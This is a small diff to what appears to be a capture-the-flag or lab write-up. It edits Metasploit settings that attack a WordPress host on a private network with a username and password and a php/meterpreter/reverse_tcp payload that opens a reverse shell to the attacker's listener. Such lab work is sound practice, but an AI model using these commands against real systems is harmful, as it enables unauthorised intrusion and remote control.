@@ -101,9 +101,9 @@
     ```bash
     set RHOSTS 192.168.1.226
     set RPORT 80
-    set USERNAME Elliot
+    set USERNAME elliot
     set PASSWORD ER28-0652
-    set TARGETURI /wp-admin
+    set TARGETURI /
     set LHOST 192.168.1.223
     set LPORT 4444
     set payload php/meterpreter/reverse_tcp
